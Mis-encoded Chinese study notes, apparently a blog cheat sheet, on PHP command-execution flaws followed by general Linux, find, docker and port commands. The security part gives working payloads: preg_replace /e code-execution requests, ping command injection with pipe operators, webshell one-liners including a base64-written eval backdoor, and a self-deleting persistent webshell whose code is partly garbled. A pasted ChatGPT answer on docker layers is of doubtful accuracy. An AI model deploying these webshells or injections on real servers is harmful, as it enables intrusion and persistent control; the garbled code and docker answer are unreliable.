![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/2019021218350876.png)

å‚è€ƒé“¾æ¥ï¼š

[phpä¼ªåè®®å®ç°å‘½ä»¤æ‰§è¡Œçš„ä¸ƒç§å§¿åŠ¿](https://www.freebuf.com/column/148886.html)

[PHPä¼ªåè®®æ€»ç»“](https://segmentfault.com/a/1190000018991087)

## 6.æ­£åˆ™åŒ¹é…ç»•è¿‡





## 7.preg_replace()æ­£åˆ™æ›¿æ¢/eæ¼æ´



é€šä¿—æ¥è¯´ï¼š

```
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject)
ä¸­ï¼Œ
patternæ˜¯åŒ¹é…çš„æ¨¡å¼å’Œè§„åˆ™
$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚
$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚

patternä¸­æœ‰/i,/e,ç­‰ç­‰æ¨¡å¼ï¼Œå…¶ä¸­/iæ˜¯ ä¸åŒºåˆ†å¤§å°å†™ï¼Œè€Œ/eå°±è¡¨ç¤ºå°†replacementå½“phpä»£ç æ‰§è¡Œï¼Œå› æ­¤å°±ä¼šè§¦å‘ä»£ç æ‰§è¡Œæ¼æ´
```

ä¹Ÿå°±æ˜¯è¯´åªè¦åœ¨subjectä¸­æœ‰è¦æœç´¢çš„patternçš„å†…å®¹ï¼ŒåŒæ—¶å°†åœ¨replacementå‰åŠ ä¸Š/eï¼Œè§¦å‘/eæ¼æ´ï¼Œå°±å¯ä»¥æ‰§è¡Œreplacementä¸­çš„æ­£ç¡®çš„phpä»£ç 

```
if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }
 else{
        die();
    }
    
 å› æ­¤å¯æ„å»º?pat=/abc/e&rep=system("ls")&sub=abc
 ä¾¿å¯è§¦å‘ï¼›
```

å½“ç„¶è¿˜æœ‰[æ›´å¤æ‚çš„åˆ©ç”¨æ–¹å¼](https://blog.csdn.net/Reme_mber/article/details/124185032?ops_request_misc=&request_id=&biz_id=102&utm_term=preg_replace%20/e%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-124185032.142^v73^pc_new_rank,201^v4^add_ask,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)ï¼š

```php
<?php
function test($str){}
echo preg_replace("/s*(.*)s*/ies", "\\1", $_GET["h"]);
show_source(__FILE__);
?> 
s*è¡¨ç¤ºç©ºæ ¼ï¼Œï¼ˆ.*ï¼‰è¡¨ç¤ºæ‰€æœ‰å­—ç¬¦ \1 è¡¨ç¤ºåå‘å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯${}é‡Œé¢çš„å†…å®¹ï¼›
   å¯ç›´æ¥æ„é€ ?h=${phpinfo()}
```





## 8.pingä¸ç®¡é“ç¬¦é›†åˆå½¢æˆå‘½ä»¤æ‰§è¡Œæ¼æ´

æœ‰ä¸€äº›é¡µé¢æä¾›ping urlçš„åŠŸèƒ½ï¼Œé€šå¸¸ä½¿ç”¨127.0.0.1æ¥æµ‹è¯•ï¼›

è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ 127.0.0.1|whoamiæ¥å®ç°å‘½ä»¤æ³¨å…¥ï¼›

æ¼æ´åŸç†ï¼š
æœåŠ¡ç«¯å¤„ç†pingçš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œç¨‹åºè·å–GETå‚æ•°IPï¼Œç„¶åæ‹¼æ¥åˆ°systemå‡½æ•°ä¸­ï¼Œåˆ©ç”¨systemå‡½æ•°æ‰§è¡Œpingçš„åŠŸèƒ½ï¼Œä½†æ˜¯æ­¤å¤„æ²¡æœ‰å¯¹å‚æ•°IPåšè¿‡æ»¤å’Œæ£€æµ‹ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦æ‰§è¡Œå…¶ä»–çš„ç³»ç»Ÿå‘½ä»¤ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºã€‚

```
echo system("ping -n 2".$Get(ip))
```

**Windowsç³»ä¾‹æ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹æ‰€ç¤ºã€‚**

â€œ|â€ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1|whoamiã€‚

â€œ||â€ï¼šå¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ã€‚ä¾‹å¦‚ï¼šping 2||whoamiã€‚

â€œ&â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&whoamiã€‚

â€œ&&â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&&whoamiã€‚

**Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹æ‰€ç¤ºã€‚**

â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1;whoamiã€‚

â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚ä¾‹å¦‚ï¼šping 127.0.0.1|whoamiã€‚

â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼šping 1||whoamiã€‚

â€œ&â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&whoamiã€‚

â€œ&&â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼šping 127.0.0.1&&whoamiã€‚



## webshell åé—¨æœ¨é©¬å‘½ä»¤

```php
<?php
fputs(fopen("shell.php","w"),'<?php eval($_POST[123]);?>');
?>

<?php
system("echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== | base64 -d >shell.php & ls");
?>
    
   // <?php @eval($_POST[1]);?>
    

```

ä¸æ­»é©¬

```php
<?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '.shell.php'; $code = '<?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91"){@system($_POST[cmd]);} ?>';
while (1){
file_put_contents(f i l e , file,file,code);
}
?>
```



## 9.GCå›æ”¶æœºåˆ¶





# å‘½ä»¤å¤§å…¨

æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬æœåŠ¡ï¼ŒPID

```
ps -ef
```

æŸ¥çœ‹æŸä¸ªå¼€æ”¾ç«¯å£å‘½ä»¤

```
netstat -tnlp | grep 8080
æˆ–è€…
lsof -i:8080
```



scp

å‘½ä»¤è¡Œè½¯ä»¶ä¸­å°†è¿œç¨‹æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°

ä¾‹å¦‚ï¼Œè¦å°†æœ¬åœ°æ–‡ä»¶`file.txt`å¤åˆ¶åˆ°è¿œç¨‹è®¡ç®—æœº`remote_host`çš„`/home/user/`ç›®å½•ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```
ruby
scp file.txt user@remote_host:/home/user/
```

å¦‚æœè¦ä»è¿œç¨‹è®¡ç®—æœºå¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°è®¡ç®—æœºï¼Œå¯ä»¥å°†æºè·¯å¾„å’Œç›®æ ‡è·¯å¾„äº¤æ¢ï¼Œä¾‹å¦‚ï¼š

```
ruby
scp user@remote_host:/home/user/file.txt .
```

è¿™å°†æŠŠè¿œç¨‹è®¡ç®—æœºä¸Šçš„`file.txt`æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ã€‚



## dockeræ“ä½œ

dockerå®¹å™¨å°çŸ¥è¯†ï¼š

```
å®¹å™¨å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»“æ„ï¼Œæ¯”å¦‚è¯´åœ¨dockerfileä¸­æœ‰ä¸€ä¸ªå‘½ä»¤Runï¼Œè¿™å°±æœ‰ä¸€å±‚ï¼Œå½“åˆ›å»ºä¸€ä¸ªdockerå®¹å™¨æ—¶ï¼Œä¼šä¸ºè¯¥å®¹å™¨åˆ›å»ºä¸€ä¸ªå¯è¯»å±‚ï¼ˆæ”¾åœ¨mergedä¸­)å’Œä¸€ä¸ªå¯å†™å±‚ï¼ˆdiff),å½“æˆ‘ä»¬è¦ä¿®æ”¹å®¹å™¨ä¸­çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹diffé‡Œé¢çš„å°±è¡Œï¼›ChatGPTçš„å›ç­”å¦‚ä¸‹

é—®ï¼š
ä½†æ˜¯mergedä¸­çš„æ–‡ä»¶å’Œdiffä¸­çš„æ–‡ä»¶ä¸ä¸€è‡´æ€ä¹ˆåŠï¼Ÿæ¯”å¦‚è¯´ï¼Œæˆ‘è¿è¡Œäº†ä¸€ä¸ªå®¹å™¨ï¼Œä¸‹é¢æœ‰app.jsï¼Œç„¶åæˆ‘ä¿®æ”¹äº†diffä¸‹çš„app.jsï¼Œå¹¶é‡å¯å®¹å™¨ï¼Œé‚£ä¹ˆè¿™å°†å¯¼è‡´mergedå’Œdiffä¸‹çš„app.jsä¸åŒã€‚ä¸ºä»€ä¹ˆå®¹å™¨è¿˜å¯ä»¥æ­£å¸¸è¿è¡Œå‘¢ï¼Œé‡æ–°è¿è¡Œåçš„å®¹å™¨ä»¥å“ªä¸ªç‰ˆæœ¬çš„app.jsä¸ºå‡†å‘¢ï¼Ÿ

ç­”ï¼š
åœ¨ Docker ä¸­ï¼Œå½“æ‚¨é‡å¯å®¹å™¨æ—¶ï¼ŒDocker ä¼šé‡æ–°åŠ è½½æœ€æ–°çš„å¯å†™å±‚ï¼Œä¹Ÿå°±æ˜¯ diff ç›®å½•ä¸­çš„å†…å®¹ã€‚å› æ­¤ï¼Œå®¹å™¨è¿è¡Œæ—¶ä½¿ç”¨çš„æ˜¯æœ€æ–°çš„ app.js æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ merged ä¸­çš„ç‰ˆæœ¬ã€‚

å®¹å™¨é‡å¯æ—¶ï¼ŒDocker ä¼šä»åŸå§‹é•œåƒå’Œæœ€æ–°çš„ diff å±‚é‡æ–°ç”Ÿæˆå®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶é‡æ–°æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚å› æ­¤ï¼Œmerged ä¸­çš„ app.js æ–‡ä»¶å®é™…ä¸Šå·²ç»ä¸å†è¢«ä½¿ç”¨ï¼Œåªæ˜¯è¢«ä¿ç•™åœ¨ç£ç›˜ä¸Šï¼Œä¸ä¼šå¯¹å®¹å™¨çš„è¿è¡Œäº§ç”Ÿå½±å“ã€‚

å¦‚æœæ‚¨æƒ³è¦åœ¨ merged å’Œ diff ç›®å½•ä¸­åŒæ­¥ app.js æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ docker cp å‘½ä»¤å°†ä¿®æ”¹åçš„ app.js æ–‡ä»¶ä»å®¹å™¨ä¸­å¤åˆ¶åˆ°å®¿ä¸»æœºä¸Šï¼Œå¹¶æ‰‹åŠ¨å°†å…¶å¤åˆ¶åˆ° merged ç›®å½•ä¸­ã€‚è¿™æ ·åšå¯ä»¥ä¿è¯ merged å’Œ diff ç›®å½•ä¸­çš„æ–‡ä»¶ä¿æŒåŒæ­¥ã€‚ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºåªè¯»çš„ merged ç›®å½•ä¸­çš„æ–‡ä»¶è¿›è¡Œæ›´æ”¹æ˜¯ä¸è¢«æ¨èçš„ï¼Œå› ä¸ºè¿™ä¼šç ´ååŸå§‹é•œåƒçš„ä¸€è‡´æ€§å’Œå¯ç§»æ¤æ€§ã€‚
```

è¿›å…¥å®¹å™¨

```
docker exec -it  å®¹å™¨id /bin/bash
```

é€€å‡ºå®¹å™¨

```
åœ¨å®¹å™¨å†…æŒ‰ctrl +P+Q
```



## Linux

sudo -l å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸‹çš„æƒé™ï¼›å“ªäº›æ–‡ä»¶æœ‰äº›ä»€ä¹ˆæƒé™ï¼›

## Findå‘½ä»¤

æŸ¥æ‰¾æŸæ®µå­—ç¬¦åœ¨å“ªä¸ªæ–‡ä»¶

```
find / -name "*.py" -type f | xargs grep "Remote connections are forbidden"
è¡¨ç¤ºåœ¨åç¼€åä¸ºpyçš„æ‰€æœ‰æ–‡ä»¶ä¸­æœç´¢å«æœ‰å­—ç¬¦"Remote connections are forbidden"çš„æ–‡ä»¶
```

#### 1ã€æ ¹æ®æ–‡ä»¶åæŸ¥æ‰¾

å‚æ•°

```yaml
-name "æ–‡ä»¶åç§°": åŒºåˆ†å¤§å°å†™ï¼Œæ”¯æŒä½¿ç”¨glob é€šé…ç¬¦ * ? []  [^]
            
-iname "æ–‡ä»¶åç§°"ï¼šä¸åŒºåˆ†å­—æ¯å¤§å°å†™
                    
-path "/path/name" : åŒ¹é…æŸä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„å®Œæ•´è·¯å¾„ï¼Œè€Œä¸ä»…ä»…æ˜¯åŒ¹é…æ–‡ä»¶å
12345
```

ç¤ºä¾‹ï¼š

```yaml
# æŸ¥æ‰¾ /usr ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åä»¥ .txt ç»“å°¾çš„æ–‡ä»¶
find /usr -name '*.txt'

#æŸ¥æ‰¾ /usr ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ååˆšå¥½ä¸º 4 ä¸ªå­—ç¬¦çš„æ–‡ä»¶
find /usr -name '????'

#æŸ¥æ‰¾ /usr ä¸‹æ‰€æœ‰æ–‡ä»¶åä»¥ .txt ç»“å°¾çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸”è¯¥æ–‡ä»¶çš„çˆ¶ç›®å½•å¿…é¡»æ˜¯ src
find /usr -path '*/src/*.txt'	

123456789
```

#### 2ã€æ ¹æ®æ–‡ä»¶ç±»å‹æŸ¥æ‰¾

```yaml
-type ç±»å‹
    fï¼šæ™®é€šæ–‡ä»¶
    dï¼šç›®å½•æ–‡ä»¶
    lï¼šç¬¦å·é“¾æ¥æ–‡ä»¶
    sï¼šå¥—æ¥å­—æ–‡ä»¶
    bï¼šå—è®¾å¤‡æ–‡ä»¶
    cï¼šå­—ç¬¦è®¾å¤‡æ–‡ä»¶
    pï¼šç®¡é“æ–‡ä»¶
    
# æ£€ç´¢ /usr ä¸‹æ‰€æœ‰æ–‡ä»¶åä»¥ python å¼€å¤´çš„ç›®å½•
find /usr -type d -name 'python*'
1234567891011
```

#### 3ã€æ ¹æ®æ–‡ä»¶å¤§å°æ¥æŸ¥æ‰¾

```yaml
-size [+|-] #Unit

#Unitå¸¸ç”¨å•ä½ï¼šK M G
#+ æˆ– - ç¬¦å·è¡¨ç¤ºå¤§äºæˆ–å°äºå½“å‰æ¡ä»¶

#Unit : ï¼ˆ#-1ï¼Œ#]
-#Unit : [0,#-1] : å°äºæŒ‡å®šå¤§å°æ–‡ä»¶
+#Unix : (#,) : å¤§äºæŒ‡å®šå¤§å°æ–‡ä»¶

# æŸ¥æ‰¾å¤§äº100Mçš„æ–‡ä»¶
find / -size +100M 
1234567891011
```

#### 4ã€æ ¹æ®æ—¶é—´æˆ³æŸ¥æ‰¾

```yaml
Linux ç³»ç»Ÿä¸­ï¼Œä¸æ–‡ä»¶ç›¸å…³è”çš„æ—¶é—´å‚æ•°æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š

ä¿®æ”¹æ—¶é—´ï¼ˆModification timeï¼‰ï¼šæœ€åä¸€æ¬¡æ–‡ä»¶å†…å®¹æœ‰è¿‡æ›´æ”¹çš„æ—¶é—´ç‚¹
è®¿é—®æ—¶é—´ï¼ˆAccess timeï¼‰ï¼šæœ€åä¸€æ¬¡æ–‡ä»¶æœ‰è¢«è¯»å–è¿‡çš„æ—¶é—´ç‚¹
å˜æ›´æ—¶é—´ï¼ˆChange timeï¼‰ï¼šæœ€åä¸€æ¬¡æ–‡ä»¶æœ‰è¢«å˜æ›´è¿‡çš„æ—¶é—´ç‚¹ï¼ˆå¦‚å†…å®¹è¢«ä¿®æ”¹ï¼Œæˆ–æƒé™ç­‰ metadata è¢«ä¿®æ”¹ï¼‰

ä¸æ­¤å¯¹åº”çš„æ˜¯ find å‘½ä»¤ä¸­çš„ -mtimeï¼Œ-atime å’Œ -ctime ä¸‰ä¸ªé€‰é¡¹

ä»¥"å¤©"ä¸ºå•ä½
    -atime [+|-]#
        #: [#,#+1) : è¿™é‡Œçš„#è¡¨ç¤º#å¤©ä¹‹å‰çš„â€œä¸€å¤©ä¹‹å†…â€è¢«è®¿é—®è¿‡çš„æ–‡ä»¶
        +#: [#+1,OO]: åˆ—å‡ºåœ¨#å¤©ä¹‹å‰ï¼ˆä¸åŒ…å«#å¤©æœ¬èº«ï¼‰è¢«è®¿é—®è¿‡çš„æ–‡ä»¶
        -#: [0,#) : åˆ—å‡ºåœ¨#å¤©ä¹‹å†…ï¼ˆåŒ…å«#å¤©æœ¬èº«ï¼‰è¢«è®¿é—®è¿‡çš„æ–‡ä»¶
        
    -mtime [+|-]
    -ctime [+|-]

ä»¥"åˆ†é’Ÿ"ä¸ºå•ä½
    -amin
    -mmin
    -cmin
    
# æŸ¥æ‰¾ä¸¤å¤©ä¹‹å‰çš„ä¸€å¤©å†…è¢«è®¿é—®çš„æ–‡ä»¶ï¼ˆè·ç¦»ç°åœ¨çš„å‰48 ~ 72 å°æ—¶ä¹‹é—´ï¼‰
find -atime  2 

# æŸ¥æ‰¾è·ç¦»æ­¤æ—¶2å¤©å†…è¢«è®¿é—®çš„æ–‡ä»¶ï¼ˆè·ç¦»ç°åœ¨å‰48å°æ—¶ä¹‹å†…ï¼‰
find -atime -2 

# ä¸¤å¤©ä¹‹å‰ï¼Œä¸åŒ…æ‹¬ä¸¤å¤©ä¹‹å‰çš„ä¸€å¤©çš„è¢«è®¿é—®çš„æ–‡ä»¶ï¼ˆç¦»æ­¤æ—¶72å°æ—¶ä¹‹å‰ï¼‰
find -atime +2 
123456789101112131415161718192021222324252627282930
```

#### 5ã€æ ¹æ®æ–‡ä»¶çš„æ‰€å±æƒ

```yaml
-user username ï¼šæŸ¥æ‰¾å±ä¸»ä¸ºæŒ‡å®šç”¨æˆ·çš„æ–‡ä»¶
-group groupname ï¼šæŸ¥æ‰¾æŒ‡å®šå±ç»„çš„æ–‡ä»¶

-uid useridï¼šæŸ¥æ‰¾å±ä¸»ä¸ºæŒ‡å®šuidå·çš„æ–‡ä»¶
-gid groupid æŸ¥æ‰¾å±ç»„ä¸ºæŒ‡å®šgidå·çš„æ–‡ä»¶

-nouser ï¼šæŸ¥æ‰¾æ²¡æœ‰å±ä¸»çš„æ–‡ä»¶
-nogroup : æŸ¥æ‰¾æ²¡æœ‰å±ç»„çš„æ–‡ä»¶

# æŸ¥æ‰¾/varç›®å½•ä¸‹å±ä¸»ä¸ºrootï¼Œä¸”å±ç»„ä¸ºmailçš„æ‰€æœ‰æ–‡ä»¶æˆ–ç›®å½•ã€
find /var -user root -a -group mail
1234567891011
```

#### 6ã€æ ¹æ®æƒé™æŸ¥æ‰¾

```yaml
-perm [+|-] Mode
Mode : ç²¾ç¡®æƒé™åŒ¹é…            
+Mode ï¼šä»»ä½•ä¸€ç±»(u,g,o)å¯¹è±¡çš„æƒé™ä¸­åªè¦æœ‰ä¸€ä½åŒ¹é…å³å¯
-Mode ï¼šå®Œå…¨åŒ…å«æ­¤modeæ—¶æ‰å¯ä»¥åŒ¹é…,æ¯ä¸€ç±»å¯¹è±¡éƒ½å¿…é¡»åŒæ—¶æ‹¥æœ‰ä¸ºå…¶æŒ‡å®šçš„æƒé™æ ‡å‡†


# æŸ¥æ‰¾åœ¨/tmpç›®å½•ä¸‹æƒé™æ˜¯755çš„æ–‡ä»¶
find  /tmp  -perm  755           

# è¡¨ç¤ºå¿…é¡»æ‰€æœ‰ç±»åˆ«ç”¨æˆ·éƒ½æ»¡è¶³æœ‰å†™æƒé™
find  /tmp  -perm  -222        

# è¡¨ç¤ºåªè¦æœ‰ä¸€ç±»ç”¨æˆ·ï¼ˆå±ä¸»ï¼Œå±ç»„ï¼Œå…¶ä»–ï¼‰çš„åŒ¹é…å†™æƒé™å°±è¡Œ
find  /tmp  -perm  +222

123456789101112131415
```

#### 7ã€é€»è¾‘ç»„åˆ

```yaml
ä¸ -a
æˆ– -o
é -not

!A -a !B = !(A -o B)
!A -o !B = !(A -a B)


# æŸ¥æ‰¾/etcç›®å½•ä¸‹æœ€è¿‘ä¸€å‘¨å†…å…¶å†…å®¹ä¿®æ”¹è¿‡ï¼Œä¸”å±ä¸»ä¸ä¸ºrootï¼Œä¹Ÿä¸æ˜¯hadoopçš„æ–‡ä»¶æˆ–ç›®å½•
 find /etc -mtime -7 -not \( -user root -o -user hadoop \)
 
 # æŸ¥æ‰¾5åˆ†é’Ÿå†…æˆ–50åˆ†é’Ÿå‰è¢«ä¿®æ”¹ ï¼Œå¹¶ä¸” ç±»å‹ä¸ºæ–‡ä»¶çš„ æ‰€æœ‰æ–‡ä»¶
 find / '(' -mmin -5 -o -mtime +50 ')' -a -type f

1234567891011121314
```

### ä¸‰ã€å¤„ç†åŠ¨ä½œ

#### 1ã€å¸¸ç”¨å¤„ç†åŠ¨ä½œ

```yaml
-print ï¼šé»˜è®¤çš„å¤„ç†åŠ¨ä½œï¼Œæ˜¾ç¤ºè‡³å±å¹•

-ls ï¼šç±»ä¼¼äºå¯¹æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œ "ls -l"å‘½ä»¤

-delete ï¼šåˆ é™¤æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶

-fls /path/to/somefile ï¼šæŸ¥æ‰¾åˆ°çš„æ‰€æœ‰æ–‡ä»¶çš„é•¿æ ¼å¼ä¿¡æ¯ä¿å­˜è‡³æŒ‡å®šæ–‡ä»¶ä¸­

# å…¶ä¸­çš„å¤§æ‹¬å·{}ä½œä¸ºæ£€ç´¢åˆ°çš„æ–‡ä»¶çš„ å ä½ç¬¦ ï¼Œç”¨äºå¼•ç”¨æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶åç§°è‡ªèº«
# è€Œåˆ†å·ï¼ˆ ;ï¼‰ä½œä¸ºå‘½ä»¤ç»“æŸçš„æ ‡å¿—, éœ€è¦è½¬ä¹‰ , ä¹Ÿå¯ä»¥ç”¨ + å·è¡¨ç¤º
# -exec command {} \;  ç­‰åŒäº -exec command {} +


-ok command {} \; 
	å¯¹æŸ¥æ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œç”±commandæŒ‡å®šçš„å‘½ä»¤
    å¯¹äºæ¯ä¸ªæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ä¹‹å‰ï¼Œéƒ½ä¼šäº¤äº’å¼è¦æ±‚ç”¨æˆ·ç¡®è®¤
    
-exec command {} \; 
	å¯¹æŸ¥æ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œç”±commandæŒ‡å®šçš„å‘½ä»¤


# æµè§ˆæ‰€æœ‰ 1G ä»¥ä¸Šå¤§å°çš„æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯
find / -type file -size +1G -ls 

# åˆ é™¤ home ç›®å½•ä¸‹æ‰€æœ‰çš„ç©ºç›®å½•ï¼š
find ~ -type d -empty -delete

# åˆ é™¤/varä¸‹ç©ºæ–‡ä»¶
find /var -size 0 -type f -exec rm -rf {} \;


12345678910111213141516171819202122232425262728293031
```

#### 2ã€åˆ é™¤å¤§é‡æ–‡ä»¶

```yaml
# åˆ é™¤æµ·é‡æ–‡ä»¶ï¼Œrmä¼šå¾ˆæ…¢ç”šè‡³å¡æ­»
# ä¸€èˆ¬ç”¨ find æˆ– rsync æ¥åˆ é™¤å¤§é‡æ–‡ä»¶
# rsync é€Ÿåº¦å¿«äº find

# å¯ä»¥ç”¨ time æµ‹è¯•é€Ÿåº¦
#time find ./ -type f -delete     
find ./ -type f -delete  

#  test  time find ./ -type f -exec rm {} \;
find ./ -type f -exec rm {} \;  

# ä½¿ç”¨rsyncè¿›è¡Œåˆ é™¤
# é¦–å…ˆå»ºç«‹ç©ºæ–‡ä»¶å¤¹blanktest
# time rsync -a --delete blanktest/ test/
rsync -a --delete blanktest/ test/ 
123456789101112131415
```

#### 3ã€find ç»“åˆ [xargs](https://so.csdn.net/so/search?q=xargs&spm=1001.2101.3001.7020)

**æ³¨æ„ï¼š**

> find ä¼ é€’æŸ¥æ‰¾åˆ°æ–‡ä»¶è‡³åé¢æŒ‡å®šçš„å‘½ä»¤æ—¶ï¼ŒæŸ¥æ‰¾åˆ°æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ä¸€æ¬¡æ€§ä¼ é€’ç»™åé¢çš„æŒ‡ä»¤
> æœ‰äº›å‘½ä»¤ä¸èƒ½æ¥å—è¿‡å¤šå‚æ•°ï¼Œæ­¤æ—¶å‘½ä»¤æ‰§è¡Œå¯èƒ½ä¼šå¤±è´¥ï¼Œå¦ä¸€ç§æ–¹å¼å¯è§„é¿æ­¤é—®é¢˜
>
> find | xargs command

**xargs ä»‹ç»**

> xargsï¼ˆè‹±æ–‡å…¨æ‹¼ï¼š eXtended ARGumentsï¼‰æ˜¯ç»™å‘½ä»¤ä¼ é€’å‚æ•°çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œä¹Ÿæ˜¯ç»„åˆå¤šä¸ªå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ã€‚
>
> xargs å¯ä»¥å°†ç®¡é“æˆ–æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿèƒ½å¤Ÿä»æ–‡ä»¶çš„è¾“å‡ºä¸­è¯»å–æ•°æ®ã€‚

**åœ¨æŒ‡å®šè·¯å¾„ä¸‹æŸ¥æ‰¾å«æœ‰æŒ‡å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶**

```yaml
# å°†findæŸ¥æ‰¾çš„æ‰€æœ‰æ–‡ä»¶ ä½œä¸ºå‚æ•°ä¼ é€’ç»™ grepè¿›è¡Œè¿‡æ»¤
find /path | xargs grep -ri "string" 
12
```

### å››ã€å¸¸ç”¨ç¤ºä¾‹

```yaml
# æŸ¥æ‰¾å¤§äº200Mçš„æ–‡ä»¶ï¼Œå¹¶æ˜¾ç¤ºå…·ä½“å¤§å°
find / -type f -size +200M 2>/dev/null | xargs du -sh

# æŸ¥æ‰¾å¤§äº200Mçš„æ–‡ä»¶ï¼Œå¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
find / -type f -size +200M 2>/dev/null | xargs ls -l

# æŸ¥æ‰¾ç³»ç»Ÿä¸­ æœ€å¤§çš„ 10 ä¸ªæ–‡ä»¶
find / -type f -exec du -sh {} + 2>/dev/null | sort -rh | head -n 10

# æŸ¥æ‰¾ /etc ä¸‹ æ–‡ä»¶å†…åŒ…å« "password" çš„æ–‡ä»¶
find /etc | xargs grep -ri "password" 

# éå†æŸ¥æ‰¾æ‰€æœ‰ç›®å½•ä¸‹çš„ Inodeæ•°é‡
for i in /*; do echo $i; find $i  2>/dev/null | wc -l; done

# åˆ é™¤å¤§ä¸100Mï¼Œæ—¶é—´åœ¨7å¤©å‰çš„æ–‡ä»¶
find /test -size +100M -mtime +7 -delete
```













## ç«¯å£æ“ä½œ

### lsof

æŸ¥çœ‹æ­£åœ¨è¿è¡Œæœ‰è¿›ç¨‹çš„ç«¯å£

```
lsof -iTCP -sTCP:LISTEN -P
æŒ‡å®šç«¯å£ï¼šlsof -i:80
```

### netstat

æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ç«¯å£

```
netstat -antl
```

### firewalldæ‰“å¼€ç«¯å£

```
å¯åŠ¨ï¼š systemctl start firewalld
